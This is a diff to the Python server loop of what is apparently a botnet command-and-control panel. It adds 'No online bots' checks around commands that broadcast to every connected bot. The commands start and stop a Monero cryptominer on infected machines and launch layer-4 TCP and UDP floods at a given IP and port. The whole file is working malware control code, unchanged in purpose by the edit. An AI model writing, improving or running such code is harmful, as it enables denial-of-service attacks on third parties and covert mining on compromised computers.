@@ -178,54 +178,73 @@ def server():
 
                     # Miner
                     elif console == "miner stop":
-                        for client in clients:
-                            client.sendall(console.encode())
-
-                            print("\033[96m[*]\033[0m Miner stoped\n")
-
-                    elif console.startswith("miner"):
-                        if len(console.split()) == 4:
+                        if len(clients) > 0:
                             for client in clients:
                                 client.sendall(console.encode())
 
-                                print("\033[32m[+]\033[0m Miner started\n")
+                                print("\033[96m[*]\033[0m Miner stoped\n")
+                        else:
+                            print("\033[31m[-]\033[0m No online bots\n")
+
+                    elif console.startswith("miner"):
+                        if len(console.split()) == 4:
+                            if len(clients) > 0:
+                                for client in clients:
+                                    client.sendall(console.encode())
+
+                                    print("\033[32m[+]\033[0m Miner started\n")
+                            else:
+                                print("\033[31m[-]\033[0m No online bots\n")
                         else:
                             print("Usage: miner <pool:port> <monero_wallet> <worker_name>\n")
 
                     # Methods
                     elif console == "l4 tcp stop":
-                        for client in clients:
-                            client.sendall(console.encode())
-
-                            print("\033[96m[*]\033[0m L4 TCP Stoped\n")
-
-                    elif console == "l4 udp stop":
-                        for client in clients:
-                            client.sendall(console.encode())
-
-                            print("\033[96m[*]\033[0m L4 UDP Stoped\n")
-
-                    elif console.startswith("l4 tcp"):
-                        if len(console.split()) == 5:
+                        if len(clients) > 0:
                             for client in clients:
                                 client.sendall(console.encode())
 
-                                print("\033[96m[*]\033[0m L4 TCP Started\n")
+                                print("\033[96m[*]\033[0m L4 TCP Stoped\n")
+                        else:
+                            print("\033[31m[-]\033[0m No online bots\n")
+
+                    elif console == "l4 udp stop":
+                        if len(clients) > 0:
+                            for client in clients:
+                                client.sendall(console.encode())
+
+                                print("\033[96m[*]\033[0m L4 UDP Stoped\n")
+                        else:
+                            print("\033[31m[-]\033[0m No online bots\n")
+
+                    elif console.startswith("l4 tcp"):
+                        if len(console.split()) == 5:
+                            if len(clients) > 0:
+                                for client in clients:
+                                    client.sendall(console.encode())
+
+                                    print("\033[96m[*]\033[0m L4 TCP Started\n")
+                            else:
+                                print("\033[31m[-]\033[0m No online bots\n")
                         else:
                             print("Usage: l4 tcp <ip> <port> <bytes>\n")
 
                     elif console.startswith("l4 udp"):
                         if len(console.split()) == 4:
-                            for client in clients:
-                                client.sendall(console.encode())
+                            if len(clients) > 0:
+                                for client in clients:
+                                    client.sendall(console.encode())
 
-                                print("\033[96m[*]\033[0m L4 UDP Started\n")
+                                    print("\033[96m[*]\033[0m L4 UDP Started\n")
+                            else:
+                                print("\033[31m[-]\033[0m No online bots\n")
                         else:
                             print("Usage: l4 udp <ip> <bytes>\n")
 
                     else:
-                        for client in clients:
-                            client.sendall(console.encode())
+                        if len(clients) > 0:
+                            for client in clients:
+                                client.sendall(console.encode())
             else:
                 print("\033[31m[-]\033[0m No online bots\n")
 
